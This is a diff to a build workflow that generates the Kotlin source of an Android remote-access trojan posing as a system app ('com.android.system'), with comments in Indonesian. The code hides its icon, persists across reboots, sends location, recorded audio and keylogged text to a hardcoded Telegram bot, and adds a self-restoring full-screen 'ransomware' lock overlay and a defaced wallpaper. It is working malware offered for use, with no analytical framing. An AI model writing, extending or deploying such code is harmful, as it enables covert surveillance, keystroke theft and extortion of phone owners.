@@ -92,7 +92,6 @@ jobs:
         }
         EOF
 
-        # UPDATE PERIZINAN: Tambah SYSTEM_ALERT_WINDOW, CAMERA, RECORD_AUDIO, SET_WALLPAPER
         cat > app/src/main/AndroidManifest.xml << 'EOF'
         <?xml version="1.0" encoding="utf-8"?>
         <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.system">
@@ -106,6 +105,9 @@ jobs:
             <uses-permission android:name="android.permission.CAMERA" />
             <uses-permission android:name="android.permission.RECORD_AUDIO" />
             <uses-permission android:name="android.permission.SET_WALLPAPER" />
+            <uses-permission android:name="android.permission.WAKE_LOCK" />
+            <!-- Tambah ini buat restart otomatis -->
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
             <application
                 android:allowBackup="true"
@@ -134,7 +136,6 @@ jobs:
         </manifest>
         EOF
 
-        # UPDATE MAIN ACTIVITY: Handle izin Overlay
         cat > app/src/main/java/com/android/system/MainActivity.kt << 'EOF'
         package com.android.system
 
@@ -147,6 +148,7 @@ jobs:
         import androidx.appcompat.app.AppCompatActivity
         import android.content.ComponentName
         import android.content.pm.PackageManager
+        import android.os.PowerManager
 
         class MainActivity : AppCompatActivity() {
             override fun onCreate(savedInstanceState: Bundle?) {
@@ -158,7 +160,7 @@ jobs:
                 }
                 setContentView(textView)
 
-                // Minta izin Overlay (buat Ransomware Lock)
+                // 1. Minta izin Overlay
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     if (!Settings.canDrawOverlays(this)) {
                         val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
@@ -166,8 +168,19 @@ jobs:
                     }
                 }
 
+                // 2. Minta izin matiin Battery Optimization
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    val pm = getSystemService(POWER_SERVICE) as PowerManager
+                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                        intent.data = Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    }
+                }
+
                 startService(Intent(this, SpyService::class.java))
 
+                // Sembunyiin ikon setelah 5 detik
                 android.os.Handler().postDelayed({
                     val componentName = ComponentName(this, MainActivity::class.java)
                     packageManager.setComponentEnabledSetting(
@@ -180,18 +193,17 @@ jobs:
         }
         EOF
 
-        # UPDATE SPY SERVICE: Fitur RAT, Lock, Wallpaper, Voice, Cam
         cat > app/src/main/java/com/android/system/SpyService.kt << 'EOF'
         package com.android.system
 
         import android.app.Service
-        import android.content.Context
         import android.content.Intent
         import android.graphics.PixelFormat
         import android.location.LocationManager
         import android.os.IBinder
         import android.view.Gravity
         import android.view.WindowManager
+        import android.widget.LinearLayout
         import android.widget.TextView
         import android.graphics.Color
         import java.util.Timer
@@ -205,19 +217,22 @@ jobs:
         import android.graphics.Paint
         import android.media.MediaRecorder
         import java.io.File
-        import java.io.FileOutputStream
+        import android.os.Handler
+        import android.os.Looper
 
         class SpyService : Service() {
             private val client = OkHttpClient()
             private val TG_TOKEN = "9165602208:AAFDWdd-GBUy-kbmArZ0QVDMGinA616f2WQ"
             private val TG_CHAT_ID = "8831607999"
             private var lastUpdateId = 0
-            private var overlayView: TextView? = null
+            private var overlayView: LinearLayout? = null
             private var mediaRecorder: MediaRecorder? = null
             private var recordFile: File? = null
+            private var isLocked = false
+            private var lockText = ""
 
             override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-                sendMessage("📱 [+] System Update Terpasang.\nBantuan: /loc, /ping, /lock <text>, /unlock, /cam, /voice, /wallpaper")
+                sendMessage("📱 [+] NexSpy RAT Terpasang.\nCommand: /loc, /lock <teks>, /unlock, /voice, /wallpaper")
                 
                 Timer().scheduleAtFixedRate(object : TimerTask() {
                     override fun run() { getLocation() }
@@ -276,51 +291,77 @@ jobs:
                     action == "/ping" -> sendMessage("🏓 Pong! Target online.")
                     
                     action == "/lock" -> {
-                        val textToShow = if(arg.isNotEmpty()) arg else "HP ANDA TERKUNCI!\nKirim tebusan ke Admin."
-                        showLockOverlay(textToShow)
-                        sendMessage("🔒 [RANSOMWARE] Layar target dikunci dengan pesan: $textToShow")
+                        lockText = if(arg.isNotEmpty()) arg else "HP ANDA TERKUNCI!\nHubungi Admin."
+                        isLocked = true
+                        showFullScreenLock(lockText)
+                        sendMessage("🔒 [RANSOMWARE] Layar dikunci. Menunggu perintah /unlock.")
                     }
                     action == "/unlock" -> {
+                        isLocked = false
                         removeLockOverlay()
-                        sendMessage("🔓 [RANSOMWARE] Layar target dibuka.")
+                        sendMessage("🔓 [RANSOMWARE] Layar dibuka.")
                     }
                     action == "/wallpaper" -> {
                         changeWallpaper()
-                        sendMessage("🖼️ [WALLPAPER] Wallpaper target diganti.")
-                    }
-                    action == "/cam" -> {
-                        sendMessage("📸 [CAMERA] Fitur kamera butuh implementasi UI CameraX. (Coming soon)")
+                        sendMessage("🖼️ [WALLPAPER] Wallpaper diganti.")
                     }
                     action == "/voice" -> {
                         toggleVoiceRecording()
                     }
-                    else -> sendMessage("❓ Perintah tidak dikenal. Cek bantuan.")
+                    else -> sendMessage("❓ Command tidak dikenal.")
                 }
             }
 
-            private fun showLockOverlay(text: String) {
+            // =========================================================
+            // FITUR LOCK SCREEN AGRESIF (FULLSCREEN + AUTO-RESTART)
+            // =========================================================
+            private fun showFullScreenLock(text: String) {
                 if (overlayView != null) return
                 try {
                     val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-                    overlayView = TextView(this).apply {
-                        this.text = text
-                        textSize = 24f
-                        setTextColor(Color.RED)
-                        setBackgroundColor(Color.BLACK)
+                    
+                    overlayView = LinearLayout(this).apply {
+                        orientation = LinearLayout.VERTICAL
                         gravity = Gravity.CENTER
-                        setPadding(50, 50, 50, 50)
+                        setBackgroundColor(Color.parseColor("#000000"))
+                        
+                        val tv = TextView(context).apply {
+                            this.text = text
+                            textSize = 30f
+                            setTextColor(Color.parseColor("#FF0000"))
+                            gravity = Gravity.CENTER
+                            setPadding(50, 50, 50, 50)
+                        }
+                        addView(tv)
                     }
+
+                    // PARAMETER OVERLAY AGRESIF
                     val params = WindowManager.LayoutParams(
                         WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                         PixelFormat.TRANSLUCENT
                     )
-                    params.gravity = Gravity.CENTER
+                    params.gravity = Gravity.TOP or Gravity.START
                     wm.addView(overlayView, params)
+
+                    // AUTO-RESTART: Kalau target coba-coba pencet Home, layar bakal ketutup lagi
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (isLocked) {
+                            try {
+                                wm.removeView(overlayView)
+                                overlayView = null
+                                showFullScreenLock(lockText) // Munculin lagi
+                            } catch(e: Exception){}
+                        }
+                    }, 2000) // Cek tiap 2 detik
+
                 } catch (e: Exception) {
-                    sendMessage("[-] Gagal nampilin Overlay. Izin SYSTEM_ALERT_WINDOW belum dikasih.")
+                    sendMessage("[-] Gagal Overlay: ${e.message}")
                 }
             }
 
@@ -336,14 +377,14 @@ jobs:
 
             private fun changeWallpaper() {
                 try {
-                    // Bikin gambar hitam polos sebagai wallpaper palsu
                     val bitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888)
                     val canvas = Canvas(bitmap)
                     canvas.drawColor(Color.BLACK)
-                    val paint = Paint()
-                    paint.setColor(Color.RED)
-                    paint.setTextSize(100f)
-                    paint.setTextAlign(Paint.Align.CENTER)
+                    val paint = Paint().apply {
+                        color = Color.RED
+                        textSize = 100f
+                        textAlign = Paint.Align.CENTER
+                    }
                     canvas.drawText("HACKED BY NEXSPY", 540f, 960f, paint)
 
                     val wm = WallpaperManager.getInstance(applicationContext)
@@ -365,7 +406,7 @@ jobs:
                         }
                         sendMessage("🎙️ [VOICE] Mulai merekam suara...")
                     } catch (e: Exception) {
-                        sendMessage("[-] Gagal rekam. Cek izin Mikrofon.")
+                        sendMessage("[-] Gagal rekam: ${e.message}")
                     }
                 } else {
                     try {
@@ -417,7 +458,6 @@ jobs:
                 if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                     val text = event.text.joinToString("")
                     if (text.isNotEmpty()) {
-                        // Kirim log ke Telegram (pakai instance sementara)
                         val service = SpyService()
                         service.sendMessage("⌨️ [KEYLOG] $text")
                     }
